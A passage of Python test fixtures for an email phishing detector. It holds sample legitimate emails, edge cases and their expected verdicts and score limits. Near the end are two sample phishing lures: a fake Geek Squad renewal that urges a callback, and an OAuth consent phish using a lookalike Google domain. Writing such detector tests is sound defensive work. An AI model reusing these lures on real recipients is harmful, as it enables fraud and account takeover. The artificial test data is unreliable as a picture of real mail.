#  8. LEGITIMATE EMAILS — MUST NOT FALSE-POSITIVE
# ═══════════════════════════════════════════════════════════════════════════

LEGIT_AMAZON_ORDER = {
    "label": "Legitimate Amazon order confirmation — valid auth, real domain",
    "tags": ["legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-001",
        sender="ship-confirm@amazon.com",
        recipient="customer@gmail.com",
        subject="Your Amazon.com order #112-9876543-2109876 has shipped",
        date="2026-05-01T08:30:00+00:00",
        body_text=(
            "Hello,\n\n"
            "Your order has shipped! Here are the details:\n\n"
            "Order #112-9876543-2109876\n"
            "Arriving Tuesday, May 5\n"
            "USB-C Charging Cable (2-Pack)\n\n"
            "Track your package: https://www.amazon.com/gp/your-account/order-history\n\n"
            "Thank you for shopping with us.\n"
            "Amazon.com"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "ship-confirm@amazon.com"},
            {"name": "To", "value": "customer@gmail.com"},
            {"name": "Received", "value": (
                "from a25-43.smtp-out.amazonses.com (54.240.25.43) "
                "by mx.google.com with ESMTPS; 01 May 2026 08:30:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.google.com; spf=pass smtp.mailfrom=amazonses.com; "
                "dkim=pass header.d=amazon.com; dmarc=pass header.from=amazon.com"
            )},
            {"name": "Return-Path", "value": "0000014f1a2b3c4d-5e6f@amazonses.com"},
        ],
    ),
}

LEGIT_MARKETING_NEWSLETTER = {
    "label": "Legitimate marketing — ESP return-path, valid auth, unsubscribe link",
    "tags": ["legitimate", "newsletter", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-002",
        sender="deals@shop.example.com",
        recipient="subscriber@gmail.com",
        subject="Weekend sale — 20% off everything",
        date="2026-05-01T09:00:00+00:00",
        body_text=(
            "Hi there!\n\n"
            "This weekend only, enjoy 20% off everything in our store.\n\n"
            "Shop now: https://shop.example.com/sale\n\n"
            "Unsubscribe: https://shop.example.com/unsubscribe?id=abc123\n"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "deals@shop.example.com"},
            {"name": "To", "value": "subscriber@gmail.com"},
            {"name": "List-Unsubscribe", "value": "<https://shop.example.com/unsubscribe?id=abc123>"},
            {"name": "Received", "value": (
                "from mta123.sendgrid.net (167.89.115.23) "
                "by mx.google.com with ESMTPS; 01 May 2026 09:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.google.com; spf=pass smtp.mailfrom=sendgrid.net; "
                "dkim=pass header.d=shop.example.com; dmarc=pass header.from=shop.example.com"
            )},
            {"name": "Return-Path", "value": "bounces+abc123@em.sendgrid.net"},
        ],
    ),
}

LEGIT_GITHUB_NOTIFICATION = {
    "label": "Legitimate GitHub PR notification — valid auth, standard format",
    "tags": ["legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-003",
        sender="notifications@github.com",
        recipient="developer@example.com",
        subject="[myorg/myrepo] Fix null pointer in auth middleware (#342)",
        date="2026-05-01T10:00:00+00:00",
        body_text=(
            "@colleague requested your review on:\n"
            "Fix null pointer in auth middleware (#342)\n\n"
            "Changes: src/auth/middleware.go (+12, -3)\n\n"
            "View: https://github.com/myorg/myrepo/pull/342\n\n"
            "— Reply to this email directly or view it on GitHub."
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "GitHub <notifications@github.com>"},
            {"name": "To", "value": "developer@example.com"},
            {"name": "List-Unsubscribe", "value": "<https://github.com/notifications/unsubscribe>"},
            {"name": "Received", "value": (
                "from out-1.smtp.github.com (192.30.252.192) "
                "by mx.example.com with ESMTPS; 01 May 2026 10:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=github.com; "
                "dkim=pass header.d=github.com; dmarc=pass header.from=github.com"
            )},
        ],
    ),
}

LEGIT_PASSWORD_RESET = {
    "label": "Legitimate password reset — user-initiated, valid auth, real domain",
    "tags": ["legitimate", "transactional", "auth_pass", "credential_ask"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-004",
        sender="noreply@accounts.google.com",
        recipient="user@gmail.com",
        subject="Password reset request for your Google Account",
        date="2026-05-01T11:00:00+00:00",
        body_text=(
            "Hello,\n\n"
            "We received a request to reset the password for your Google Account "
            "(user@gmail.com).\n\n"
            "If you made this request, click the link below:\n"
            "https://accounts.google.com/signin/v2/challenge/password/reset?token=abc123\n\n"
            "If you didn't request this, you can ignore this email.\n\n"
            "This link will expire in 24 hours.\n\n"
            "The Google Accounts team"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "noreply@accounts.google.com"},
            {"name": "To", "value": "user@gmail.com"},
            {"name": "Received", "value": (
                "from mail-sor-f41.google.com (209.85.220.41) "
                "by mx.google.com with ESMTPS; 01 May 2026 11:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.google.com; spf=pass smtp.mailfrom=accounts.google.com; "
                "dkim=pass header.d=accounts.google.com; dmarc=pass header.from=accounts.google.com"
            )},
        ],
    ),
}

LEGIT_INTERNAL_MEETING = {
    "label": "Legitimate internal meeting invite — corporate domain, auth pass",
    "tags": ["legitimate", "internal", "calendar", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-005",
        sender="calendar-server@targetcorp.com",
        recipient="employee@targetcorp.com",
        subject="Invitation: Sprint Planning (Weekly) @ Mon May 5 10:00am",
        date="2026-05-01T08:00:00+00:00",
        body_text=(
            "Sprint Planning (Weekly)\n\n"
            "When: Monday, May 5, 2026 10:00 AM - 11:00 AM\n"
            "Where: Conference Room B / https://meet.google.com/abc-defg-hij\n\n"
            "Agenda:\n"
            "- Review last sprint velocity\n"
            "- Groom backlog items\n"
            "- Assign stories for Sprint 24\n\n"
            "RSVP: Yes | No | Maybe"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "calendar-server@targetcorp.com"},
            {"name": "To", "value": "employee@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
        attachments=[
            {
                "filename": "invite.ics",
                "mime_type": "text/calendar",
                "size_bytes": 1024,
            },
        ],
    ),
}

LEGIT_COLLEAGUE_WITH_ATTACHMENT = {
    "label": "Legitimate colleague email with PDF attachment — same domain, auth pass",
    "tags": ["legitimate", "internal", "attachment_safe", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-006",
        sender="alice@targetcorp.com",
        recipient="bob@targetcorp.com",
        subject="Q1 report — final version",
        date="2026-05-01T15:30:00+00:00",
        body_text=(
            "Hi Bob,\n\n"
            "Attached is the final Q1 report with the updated revenue numbers "
            "from finance. Let me know if you have any questions before "
            "Thursday's board meeting.\n\n"
            "Best,\nAlice"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "alice@targetcorp.com"},
            {"name": "To", "value": "bob@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
        attachments=[
            {
                "filename": "Q1_2026_Report_Final.pdf",
                "mime_type": "application/pdf",
                "size_bytes": 2097152,
            },
        ],
    ),
}

LEGIT_SLACK_NOTIFICATION = {
    "label": "Legitimate Slack notification — valid auth, standard transactional",
    "tags": ["legitimate", "transactional", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="legit-007",
        sender="notification@slack.com",
        recipient="user@targetcorp.com",
        subject="3 new messages in #engineering",
        date="2026-05-01T13:45:00+00:00",
        body_text=(
            "You have 3 unread messages in #engineering:\n\n"
            "@dave: Deploy is done, all green\n"
            "@emma: Can someone review PR #891?\n"
            "@frank: Standup in 5\n\n"
            "View in Slack: https://targetcorp.slack.com/archives/C01234/p1234567890"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "Slack <notification@slack.com>"},
            {"name": "To", "value": "user@targetcorp.com"},
            {"name": "List-Unsubscribe", "value": "<https://slack.com/account/notifications>"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=slack.com; "
                "dkim=pass header.d=slack.com; dmarc=pass header.from=slack.com"
            )},
        ],
    ),
}

LEGIT_FREEMAIL_PERSONAL = {
    "label": "Personal email from freemail — friend sending a recipe, no red flags",
    "tags": ["legitimate", "freemail", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="special-004",
        sender="jane.doe.42@gmail.com",
        recipient="friend@example.com",
        subject="That pasta recipe you asked for",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Hey!\n\n"
            "Here's the pasta recipe I was telling you about:\n\n"
            "Ingredients:\n"
            "- 400g spaghetti\n"
            "- 200g guanciale\n"
            "- 4 egg yolks\n"
            "- 100g pecorino romano\n"
            "- Black pepper\n\n"
            "Cook the pasta al dente, fry the guanciale, mix egg yolks with "
            "cheese, combine everything off heat. Done!\n\n"
            "Let me know how it turns out :)"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "jane.doe.42@gmail.com"},
            {"name": "To", "value": "friend@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}

LEGITIMATE_INVOICE_WITH_ATTACHMENT = {
    "label": "Legitimate invoice with PDF — known vendor, valid auth",
    "tags": ["legitimate", "transactional", "attachment_safe", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="special-002",
        sender="invoices@aws.amazon.com",
        recipient="billing@targetcorp.com",
        subject="Your AWS invoice is available — May 2026",
        date="2026-05-01T06:00:00+00:00",
        body_text=(
            "Hello,\n\n"
            "Your AWS invoice for the billing period ending April 30, 2026 "
            "is now available. The total amount is $3,247.81.\n\n"
            "View your invoice: https://console.aws.amazon.com/billing/home\n\n"
            "Thank you for using Amazon Web Services."
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "invoices@aws.amazon.com"},
            {"name": "To", "value": "billing@targetcorp.com"},
            {"name": "Received", "value": (
                "from email-smtp.us-east-1.amazonaws.com (54.240.31.8) "
                "by mx.targetcorp.com with ESMTPS; 01 May 2026 06:00:00 -0000"
            )},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=amazonses.com; "
                "dkim=pass header.d=aws.amazon.com; dmarc=pass header.from=aws.amazon.com"
            )},
        ],
        attachments=[
            {
                "filename": "AWS_Invoice_May2026.pdf",
                "mime_type": "application/pdf",
                "size_bytes": 102400,
            },
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  9. EDGE CASES & BOUNDARY CONDITIONS
# ═══════════════════════════════════════════════════════════════════════════

EMPTY_MINIMAL = {
    "label": "Empty / minimal email — no crash, no false positive",
    "tags": ["empty_body"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-001",
        sender="someone@example.com",
        recipient="other@example.com",
        subject="",
        body_text="",
        body_html="",
        headers=[
            {"name": "From", "value": "someone@example.com"},
            {"name": "To", "value": "other@example.com"},
        ],
    ),
}

SUBJECT_ONLY_NO_BODY = {
    "label": "Subject with no body — should handle gracefully",
    "tags": ["empty_body"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-002",
        sender="colleague@targetcorp.com",
        recipient="other@targetcorp.com",
        subject="Lunch at noon?",
        body_text="",
        body_html="",
        headers=[
            {"name": "From", "value": "colleague@targetcorp.com"},
            {"name": "To", "value": "other@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
    ),
}

BENIGN_URGENCY_LEGIT_SENDER = {
    "label": "Legitimate urgent email — real domain, auth passes, but urgent language",
    "tags": ["legitimate", "urgency", "auth_pass"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-003",
        sender="ops@targetcorp.com",
        recipient="oncall@targetcorp.com",
        subject="URGENT: Production database is down",
        date="2026-05-01T02:15:00+00:00",
        body_text=(
            "The production PostgreSQL cluster is unreachable.\n\n"
            "Grafana: https://grafana.targetcorp.com/d/db-health\n"
            "PagerDuty incident: https://targetcorp.pagerduty.com/incidents/P12345\n\n"
            "Please respond immediately.\n\n"
            "— Automated monitoring"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "ops@targetcorp.com"},
            {"name": "To", "value": "oncall@targetcorp.com"},
            {"name": "Authentication-Results", "value": (
                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
            )},
        ],
    ),
}

SPF_SOFTFAIL_LEGIT_CONTENT = {
    "label": "SPF softfail but otherwise benign content",
    "tags": ["auth_fail", "legitimate"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="edge-005",
        sender="updates@small-vendor.com",
        recipient="user@example.com",
        subject="Your subscription renewal confirmation",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Hi,\n\n"
            "This confirms your annual subscription renewal for $49.99. "
            "Your next billing date is May 1, 2027.\n\n"
            "Manage your subscription: https://small-vendor.com/account\n\n"
            "Thanks for being a customer!"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "updates@small-vendor.com"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=small-vendor.com; "
                "dkim=pass header.d=small-vendor.com; dmarc=pass header.from=small-vendor.com"
            )},
        ],
    ),
}

VERY_LONG_BODY = {
    "label": "Very long email body — test truncation / performance, not malicious",
    "tags": ["legitimate", "newsletter"],
    "expected": {
        "verdict": Verdict.SAFE,
        "max_score": 15,
    },
    "email": _email(
        message_id="edge-006",
        sender="digest@techcrunch.com",
        recipient="reader@example.com",
        subject="TechCrunch Daily Digest — May 1, 2026",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Today's top stories:\n\n" + "\n\n".join(
                f"Article {i}: Lorem ipsum dolor sit amet, consectetur adipiscing elit. "
                f"Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. "
                f"Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris. "
                f"https://techcrunch.com/2026/05/01/article-{i}"
                for i in range(1, 51)
            )
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "digest@techcrunch.com"},
            {"name": "To", "value": "reader@example.com"},
            {"name": "List-Unsubscribe", "value": "<https://techcrunch.com/unsubscribe>"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=techcrunch.com; "
                "dkim=pass header.d=techcrunch.com; dmarc=pass header.from=techcrunch.com"
            )},
        ],
    ),
}

MIXED_SIGNALS = {
    "label": "Mixed signals — auth passes but freemail sender with mild urgency (ambiguous)",
    "tags": ["freemail", "urgency", "auth_pass"],
    "expected": {
        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
        "max_score": 35,
    },
    "email": _email(
        message_id="edge-007",
        sender="realcontact@gmail.com",
        recipient="user@example.com",
        subject="Can you take a look at this ASAP?",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Hey,\n\n"
            "I found this doc that might be relevant to the project. "
            "Can you take a look when you get a chance? No rush but "
            "it would be great to discuss before the meeting.\n\n"
            "https://docs.google.com/document/d/1aBcDeFgHiJkLmNoPqR\n\n"
            "Thanks!"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "realcontact@gmail.com"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
            )},
        ],
    ),
}

MULTIPLE_RECIPIENTS_BCC = {
    "label": "Mass BCC — recipient is in BCC, not in To/CC headers (spam-like)",
    "tags": ["auth_fail"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS, Verdict.MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="edge-008",
        sender="promo@unknown-store.xyz",
        recipient="user@example.com",
        subject="Exclusive deal just for you",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "Congratulations! You've been selected for an exclusive offer.\n\n"
            "Visit our store: https://unknown-store.xyz/deal\n\n"
            "Unsubscribe: https://unknown-store.xyz/unsub"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "promo@unknown-store.xyz"},
            {"name": "To", "value": "undisclosed-recipients:;"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=softfail smtp.mailfrom=unknown-store.xyz; "
                "dkim=none; dmarc=fail header.from=unknown-store.xyz"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  10. SPECIAL CATEGORIES
# ═══════════════════════════════════════════════════════════════════════════

CALLBACK_PHISHING = {
    "label": "Callback phishing — no link, asks victim to call a phone number",
    "tags": ["impersonation", "urgency", "threat"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="special-001",
        sender="billing@geek-squad-renewal.com",
        recipient="victim@example.com",
        subject="Your Geek Squad subscription ($449.99) has been renewed",
        date="2026-05-01T07:00:00+00:00",
        body_text=(
            "Thank you for renewing your Geek Squad Total Protection Plan.\n\n"
            "Amount charged: $449.99\n"
            "Date: May 1, 2026\n"
            "Payment method: Visa ending in ****\n\n"
            "If you did not authorize this charge, please call our "
            "cancellation department immediately:\n\n"
            "☎ 1-888-555-0199\n\n"
            "Our agents are available 24/7.\n\n"
            "Geek Squad Billing Team"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "billing@geek-squad-renewal.com"},
            {"name": "To", "value": "victim@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=none smtp.mailfrom=geek-squad-renewal.com; "
                "dkim=none; dmarc=none header.from=geek-squad-renewal.com"
            )},
        ],
    ),
}

CREDENTIAL_PHISH_OAUTH = {
    "label": "OAuth consent phishing — asks to grant app permissions, not credentials directly",
    "tags": ["spoofed_sender", "credential_ask", "auth_fail"],
    "expected": {
        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
        "min_score": 15,
    },
    "email": _email(
        message_id="special-003",
        sender="security@docs-google-verify.com",
        recipient="user@example.com",
        subject="Important: review document shared with you",
        date="2026-05-01T12:00:00+00:00",
        body_text=(
            "A document has been shared with you via Google Docs.\n\n"
            "To view the document, you need to authorize the app:\n"
            "https://docs-google-verify.com/oauth/consent?scope=drive,gmail\n\n"
            "This authorization is required for security purposes.\n\n"
            "Google Docs Team"
        ),
        body_html="",
        headers=[
            {"name": "From", "value": "security@docs-google-verify.com"},
            {"name": "To", "value": "user@example.com"},
            {"name": "Authentication-Results", "value": (
                "mx.example.com; spf=pass smtp.mailfrom=docs-google-verify.com; "
                "dkim=pass header.d=docs-google-verify.com; "
                "dmarc=pass header.from=docs-google-verify.com"
            )},
        ],
    ),
}


# ═══════════════════════════════════════════════════════════════════════════
#  BACKWARD-COMPATIBLE ALIASES
# ═══════════════════════════════════════════════════════════════════════════

MASS_PHISHING = MASS_PHISHING_PAYPAL
LEGIT_MARKETING = LEGIT_MARKETING_NEWSLETTER
MALWARE_ATTACHMENT = MALWARE_DOUBLE_EXTENSION


# ═══════════════════════════════════════════════════════════════════════════
#  COLLECTIONS
# ═══════════════════════════════════════════════════════════════════════════

ALL_FIXTURES: list[dict] = [
    # Phishing
    MASS_PHISHING_PAYPAL,
    MASS_PHISHING_MICROSOFT,
    PHISHING_BANK_HTML_FORM,
    PHISHING_HIDDEN_URL,
    # Spear phishing
    SPEAR_PHISH_COUSIN_DOMAIN,
    SPEAR_PHISH_THREAD_HIJACK,
    SPEAR_PHISH_HOMOGLYPH,
    # BEC
    BEC_WIRE_TRANSFER,
    BEC_GIFT_CARDS,
    BEC_PAYROLL_DIVERSION,
    # Malware
    MALWARE_DOUBLE_EXTENSION,
    MALWARE_MACRO_DOC,
    MALWARE_PASSWORD_PROTECTED_ZIP,
    MALWARE_HTML_ATTACHMENT,
    # Scams
    NIGERIAN_419_SCAM,
    SEXTORTION_SCAM,
    LOTTERY_SCAM,
    # Quishing
    QUISHING_MFA_RESET,
    # Evasion
    EVASION_HIDDEN_TEXT,
    EVASION_DATA_URI,
    EVASION_MULTI_LANGUAGE,
    # Legitimate
    LEGIT_AMAZON_ORDER,
    LEGIT_MARKETING_NEWSLETTER,
    LEGIT_GITHUB_NOTIFICATION,
    LEGIT_PASSWORD_RESET,
    LEGIT_INTERNAL_MEETING,
    LEGIT_COLLEAGUE_WITH_ATTACHMENT,
    LEGIT_SLACK_NOTIFICATION,
    LEGIT_FREEMAIL_PERSONAL,
    LEGITIMATE_INVOICE_WITH_ATTACHMENT,
    # Edge cases
    EMPTY_MINIMAL,
    SUBJECT_ONLY_NO_BODY,
    BENIGN_URGENCY_LEGIT_SENDER,
    SPF_SOFTFAIL_LEGIT_CONTENT,
    VERY_LONG_BODY,
    MIXED_SIGNALS,
    MULTIPLE_RECIPIENTS_BCC,
    # Special
    CALLBACK_PHISHING,
    CREDENTIAL_PHISH_OAUTH,
]

SAFE_FIXTURES = [f for f in ALL_FIXTURES if f["expected"].get("verdict") == Verdict.SAFE]

BY_TAG: dict[str, list[dict]] = {}
for _fixture in ALL_FIXTURES:
    for _tag in _fixture.get("tags", []):
        BY_TAG.setdefault(_tag, []).append(_fixture)
